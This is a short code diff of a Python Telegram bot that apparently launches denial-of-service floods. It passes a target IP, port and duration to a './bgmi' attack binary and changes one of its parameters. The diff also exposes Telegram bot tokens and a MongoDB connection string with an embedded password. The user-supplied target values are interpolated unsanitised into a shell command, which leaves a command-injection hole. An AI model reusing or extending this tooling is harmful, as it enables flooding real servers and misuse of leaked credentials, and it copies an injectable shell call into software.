@@ -15,7 +15,7 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '7468132393:AAHUnv9IyTsTnySxqUO_qM2n6gxEvcJQSi0'
+TOKEN = '7227553659:AAFFVUggqoS4OiDa7cRRPpDajRUgYGNXffI'
 MONGO_URI = 'mongodb+srv://eclipwzecoins:sopore45@arqambgmi.ejtcs.mongodb.net/?retryWrites=true&w=majority&appName=arqambgmi'
 FORWARD_CHANNEL_ID = -1002166347748
 CHANNEL_ID = -1002166347748
@@ -70,7 +70,7 @@ async def start_asyncio_loop():
         await asyncio.sleep(1)
 
 async def run_attack_command_async(message_id, chat_id, target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 180")
+    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 220")
     await process.communicate()
 
     # After the attack finishes, update the message
